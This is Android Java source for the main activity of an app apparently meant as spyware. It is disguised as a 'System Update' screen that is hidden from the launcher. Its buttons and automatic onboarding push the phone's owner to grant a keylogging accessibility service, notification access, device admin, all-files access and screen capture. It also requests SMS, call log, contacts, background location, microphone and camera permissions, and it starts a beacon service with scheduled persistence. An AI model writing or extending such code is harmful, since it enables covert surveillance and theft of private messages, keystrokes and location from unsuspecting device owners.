package com.hackit.agent;

import android.Manifest;
import android.app.Activity;
import android.content.Intent;
import android.net.Uri;
import android.os.Build;
import android.os.Bundle;
import android.provider.Settings;
import android.view.View;
import android.widget.Button;
import android.widget.LinearLayout;
import android.widget.ScrollView;
import android.widget.TextView;

import java.util.ArrayList;
import java.util.List;

/**
 * Setup surface. Normally hidden from the launcher; reachable with
 * {@code adb shell am start -n com.hackit.agent/.MainActivity}. Everything on
 * it maps to one special permission the platform will not grant silently.
 */
public class MainActivity extends Activity {
    static final int PERM_CODE = 0x5F1B;
    private TextView body;

    @Override
    protected void onCreate(Bundle state) {
        super.onCreate(state);
        ScrollView scroll = new ScrollView(this);
        LinearLayout column = new LinearLayout(this);
        column.setOrientation(LinearLayout.VERTICAL);
        column.setPadding(36, 48, 36, 48);
        scroll.addView(column);

        TextView title = new TextView(this);
        title.setText("System Update");
        title.setTextSize(20f);
        column.addView(title);
        body = new TextView(this);
        body.setTextSize(12f);
        body.setPadding(0, 24, 0, 24);
        column.addView(body);
        body.setText(Log.dump(this));

        addButton(column, "Run setup wizard (all grants)", new View.OnClickListener() {
            @Override
            public void onClick(View view) {
                getSharedPreferences("svc", MODE_PRIVATE).edit()
                        .putBoolean("onboard_done", false).putInt("onboard_step", 0).apply();
                Onboard.start(MainActivity.this);
            }
        });
        addButton(column, "Request runtime permissions", new View.OnClickListener() {
            @Override
            public void onClick(View view) {
                ask();
            }
        });
        addButton(column, "Enable accessibility (keylog)", new View.OnClickListener() {
            @Override
            public void onClick(View view) {
                startActivity(new Intent(Settings.ACTION_ACCESSIBILITY_SETTINGS));
            }
        });
        addButton(column, "Enable notification listener", new View.OnClickListener() {
            @Override
            public void onClick(View view) {
                startActivity(new Intent("android.settings.ACTION_NOTIFICATION_LISTENER_SETTINGS"));
            }
        });
        addButton(column, "Enable device admin", new View.OnClickListener() {
            @Override
            public void onClick(View view) {
                Intent intent = new Intent(android.app.admin.DevicePolicyManager.ACTION_ADD_DEVICE_ADMIN);
                intent.putExtra(android.app.admin.DevicePolicyManager.EXTRA_DEVICE_ADMIN,
                        new android.content.ComponentName(MainActivity.this, AdminReceiver.class));
                startActivity(intent);
            }
        });
        addButton(column, "Ignore battery optimisation", new View.OnClickListener() {
            @Override
            public void onClick(View view) {
                if (Build.VERSION.SDK_INT < 23) {
                    ToastMsg.show(MainActivity.this, "not available on this version");
                    return;
                }
                try {
                    Intent intent = new Intent(Settings.ACTION_REQUEST_IGNORE_BATTERY_OPTIMIZATIONS);
                    intent.setData(Uri.parse("package:" + getPackageName()));
                    startActivity(intent);
                } catch (Throwable ignored) {
                    try {
                        startActivity(new Intent(Settings.ACTION_IGNORE_BATTERY_OPTIMIZATION_SETTINGS));
                    } catch (Throwable second) {
                        ToastMsg.show(MainActivity.this, "battery settings unavailable");
                    }
                }
            }
        });
        addButton(column, "All files access", new View.OnClickListener() {
            @Override
            public void onClick(View view) {
                if (Build.VERSION.SDK_INT >= 30) {
                    Intent intent = new Intent(Settings.ACTION_MANAGE_APP_ALL_FILES_ACCESS_PERMISSION);
                    intent.setData(Uri.parse("package:" + getPackageName()));
                    startActivity(intent);
                }
            }
        });
        addButton(column, "Screen capture consent", new View.OnClickListener() {
            @Override
            public void onClick(View view) {
                ScreenCap.request(MainActivity.this);
            }
        });
        addButton(column, "Toggle launcher icon", new View.OnClickListener() {
            @Override
            public void onClick(View view) {
                Launcher.setEnabled(MainActivity.this, !Launcher.enabled(MainActivity.this));
                refresh();
            }
        });
        addButton(column, "Restart service", new View.OnClickListener() {
            @Override
            public void onClick(View view) {
                BeaconService.start(MainActivity.this);
                refresh();
            }
        });

        setContentView(scroll);
        // A screenshot task can cold-start this activity just for the consent.
        if (getIntent() != null && getIntent().getBooleanExtra("projection", false)) {
            ScreenCap.request(this);
        }
        // First launch walks every permission Android will not hand out silently.
        if (!Onboard.done(this)) {
            Onboard.start(this);
        }
    }

    private void addButton(LinearLayout parent, String label, View.OnClickListener listener) {
        Button button = new Button(this);
        button.setText(label);
        button.setAllCaps(false);
        button.setOnClickListener(listener);
        parent.addView(button);
    }

    private void refresh() {
        if (body != null) {
            body.setText(Log.dump(this));
        }
    }

    private void ask() {
        List<String> wanted = new ArrayList<String>();
        String[] runtime = {
                Manifest.permission.READ_SMS, Manifest.permission.SEND_SMS,
                Manifest.permission.READ_CALL_LOG, Manifest.permission.READ_CONTACTS,
                Manifest.permission.READ_PHONE_STATE, Manifest.permission.ACCESS_FINE_LOCATION,
                Manifest.permission.ACCESS_COARSE_LOCATION, Manifest.permission.RECORD_AUDIO,
                Manifest.permission.CAMERA,
        };
        for (String permission : runtime) {
            if (!Common.granted(this, permission)) {
                wanted.add(permission);
            }
        }
        if (Build.VERSION.SDK_INT >= 30 && !android.os.Environment.isExternalStorageManager()) {
            // MANAGE_EXTERNAL_STORAGE is a settings toggle, not a dialog.
        } else if (Build.VERSION.SDK_INT <= 32
                && !Common.granted(this, Manifest.permission.READ_EXTERNAL_STORAGE)) {
            wanted.add(Manifest.permission.READ_EXTERNAL_STORAGE);
        }
        if (Build.VERSION.SDK_INT >= 33 && !Common.granted(this, "android.permission.POST_NOTIFICATIONS")) {
            wanted.add("android.permission.POST_NOTIFICATIONS");
        }
        if (!wanted.isEmpty()) {
            requestPermissions(wanted.toArray(new String[0]), PERM_CODE);
        }
        refresh();
    }

    @Override
    public void onRequestPermissionsResult(int code, String[] permissions, int[] results) {
        if (code != PERM_CODE) {
            return;
        }
        refresh();
        BeaconService.poke(this);
        BeaconService.upgrade(this);
        // Android 11+ only offers "allow all the time" once foreground location
        // is already granted, so background is asked on its own second pass.
        if (Build.VERSION.SDK_INT >= 29
                && Common.granted(this, Manifest.permission.ACCESS_FINE_LOCATION)
                && !Common.granted(this, Manifest.permission.ACCESS_BACKGROUND_LOCATION)) {
            requestPermissions(new String[]{Manifest.permission.ACCESS_BACKGROUND_LOCATION}, PERM_CODE + 1);
        }
    }

    @Override
    protected void onResume() {
        super.onResume();
        BeaconService.start(this);
        BeaconService.upgrade(this);
        Scheduler.arm(this);
        if (!Onboard.done(this) && !Onboard.running()) {
            Onboard.start(this);
        }
    }

    @Override
    protected void onActivityResult(int code, int result, Intent data) {
        super.onActivityResult(code, result, data);
        if (code == ScreenCap.REQUEST && result == RESULT_OK && data != null) {
            ScreenCap.attach(this, result, data);
            ToastMsg.show(this, "projection ready — run screenshot again");
        }
    }
}
